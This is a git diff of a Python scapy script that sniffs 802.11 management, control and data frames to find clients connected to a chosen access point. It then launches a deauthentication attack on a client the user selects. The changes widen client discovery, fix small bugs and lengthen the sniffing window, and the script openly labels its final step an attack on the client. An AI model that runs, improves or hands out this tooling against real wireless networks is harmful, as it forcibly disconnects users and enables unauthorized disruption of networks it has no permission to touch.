@@ -8,10 +8,18 @@ from scapy.all import *
 from frametypes import *
 from subtypes import *
 
-client_subtypes =   (ManagmentFrameSubType.AssociationRequest, 
-                    ManagmentFrameSubType.ReassociationRequest,
-                    ManagmentFrameSubType.ProbeRequest,
-                    ManagmentFrameSubType.Authentication)
+management_subtypes =  (ManagmentFrameSubType.AssociationRequest, 
+                        ManagmentFrameSubType.ReassociationRequest,
+                        ManagmentFrameSubType.ProbeRequest,
+                        ManagmentFrameSubType.Authentication, 
+                        ManagmentFrameSubType.Action)
+
+control_subtypes = (ControlFrameSubType.BA,
+                    ControlFrameSubType.BAR,
+                    ControlFrameSubType.RTS)
+
+data_subtypes = (DataFrameSubType.QoS_Data,
+                 DataFrameSubType.QOS_NULL)
 
 observed_clients = {}
 clients_counter = 1 #Index for each client
@@ -63,13 +71,32 @@ def test(packet):
             print (packet[Dot11].addr1)
 
 def discover_clients_of_ap(ap_mac, packet):
-    global clients_counterr
+    global clients_counter
 
-    if(packet.type == FrameType.Data and packet.subtype == DataFrameSubType.QOS_NULL \
-        and packet.addr1 == ap_mac):
+    #Check if this is a client's packet and the destination is the target AP
+    if packet.type == FrameType.Data and packet.subtype in data_subtypes \
+        and packet.addr1 == ap_mac:
          if packet.addr2 not in observed_clients.values():
                 print (str(len(observed_clients) + 1 ) + \
-                ". New client discovered in type 2, subtype 12: " + packet.addr2)
+                ". New client discovered: " + packet.addr2 + " Type: " + str(packet.type) + " Subtype: " + str(packet.subtype))
+                observed_clients[clients_counter] = packet.addr2
+                clients_counter += 1
+    
+    #Check if this is a client's packet and the destination is the target AP
+    if packet.type == FrameType.Control and packet.subtype in control_subtypes \
+        and packet.addr1 == ap_mac:
+         if packet.addr2 not in observed_clients.values():
+                print (str(len(observed_clients) + 1 ) + \
+                ". New client discovered: " + packet.addr2 + " Type: " + str(packet.type) + " Subtype: " + str(packet.subtype))
+                observed_clients[clients_counter] = packet.addr2
+                clients_counter += 1
+
+    #Check if this is a client's packet and the destination is the target AP
+    if packet.type == FrameType.Management and packet.subtype in management_subtypes \
+        and packet.addr1 == ap_mac:
+         if packet.addr2 not in observed_clients:
+                print (str(len(observed_clients) + 1 ) + \
+                ". New client discovered: " + packet.addr2 + " Type: " + str(packet.type) + " Subtype: " + str(packet.subtype))
                 observed_clients[clients_counter] = packet.addr2
                 clients_counter += 1
     
@@ -78,7 +105,7 @@ def discover_clients(packet):
 
 def run_deauthenticate(iface, dest_mac, src_mac):
     thread = threading.Thread(target=deauthenticate, args=(iface, dest_mac, src_mac))
-
+    #TODO: Check how it works without a thread
     thread.start()
     for i in range(15):
         time.sleep(2)
@@ -135,19 +162,20 @@ if __name__ == "__main__":
         index = get_index_input("Choose network index to scan for connected clients", networks_dic)
         #Extract the name of network based on it's index in the data frame
         ssid = networks[networks['INDEX']==index]['SSID'].values[0]
-        print("Scanning for available clients at network '{}'.".format(ssid))
+        print("Scanning for available clients at network '{}'...".format(ssid))
 
         #Get the target AP MAC address
         target_ap = networks_dic[index]
 
-        sniffer = sniff(prn=discover_clients, iface=interface, timeout=time_to_sniff * 2)
+        sniffer = sniff(prn=discover_clients, iface=interface, timeout=time_to_sniff * 7)
         print("Scan finished.")
         if(not observed_clients):
             print("Couldn't find clients on network '{}'. Try run the script again.".format(ssid))
         else:
             client_ind = get_index_input("Choose client index to start the attack", observed_clients)
-            print("Starting to attack client '{}'".format(observed_clients[client_ind], end='', flush=True))
+            print("Starting to attack client '{}'".format(observed_clients[client_ind]), end='', flush=True)
             #Send de-authentication packets
             run_deauthenticate(interface, observed_clients[client_ind], target_ap)
+            print("Done")
 
 
